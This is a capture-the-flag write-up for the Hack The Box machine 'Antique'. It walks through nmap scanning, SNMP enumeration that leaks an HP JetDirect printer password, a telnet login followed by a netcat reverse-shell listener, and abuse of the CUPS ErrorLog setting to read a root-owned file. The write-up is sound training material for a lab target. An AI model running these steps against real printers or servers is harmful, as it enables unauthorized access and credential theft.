---
layout: single
title: Antique - Hack The Box
excerpt: "Antique is an easy Linux machine featuring a network printer disclosing credentials through SNMP string which allows logging into telnet service. Foothold can be obtained by exploiting a feature in printer. CUPS administration service running locally. This service can be exploited further to gain root access on the server."
date: 2025-05-07
classes: wide
header:
  teaser: /img2/antique.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - SNMP Enumeration
  - Network Printer Abuse
  - CUPS Administration Exploitation (ErrorLog)
---


## Reconnaissance

- Nmap scan

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -Pn 10.10.11.107
```

![](/img2/Pasted%20image%2020250507100309.png)

- Nmap version and vulnerability scan

```bash
nmap -sCV -p23 -vvv 10.10.11.107
```

![](/img2/Pasted%20image%2020250507100730.png)

- Search exploits in HP JetDirect Printer

```bash
searchsploit Jetdirect
```

![](/img2/Pasted%20image%2020250507103306.png)

```bash
searchsploit -x hardware/remote/22319.txt
```

![](/img2/Pasted%20image%2020250507103407.png)


## Exploitation

- Check critical OID in HP JetDirect

```bash
snmpwalk -v2c -c public 10.10.11.107 1.3.6.1.4.1.11
```

![](/img2/Pasted%20image%2020250507110500.png)

- Decode ASCII

```bash
echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xxd -r -p
```

![](/img2/Pasted%20image%2020250507110615.png)

- Connect to printer and send reverse shell

```bash
telnet 10.10.11.107
```

![](/img2/Pasted%20image%2020250507111243.png)

```bash
nc -nlvp 9000
```

## Post-exploitation

- Check user groups

```bash
id
```

![](/img2/Pasted%20image%2020250507120816.png)

- Check if cups service is running as root

```bash
ps -aux | grep cups
```

![](/img2/Pasted%20image%2020250507122329.png)

- The group lpadmin is default group for cups

```bash
cat /etc/cups/cupsd.conf
```

![](/img2/Pasted%20image%2020250507121025.png)

- Change ErrorLog PATH to see the flag

```bash
cupsctl ErrorLog="/root/root.txt"
```

> We can check cupsd.conf file 

```bash
cat /etc/cups/cupsd.conf | grep ErrorLog
```

![](/img2/Pasted%20image%2020250507121936.png)

- Request default Log url to see the flag

```bash
curl localhost:631/admin/log/error_log
```

![](/img2/Pasted%20image%2020250507122138.png)

![](/img2/Pasted%20image%2020250507115535.png)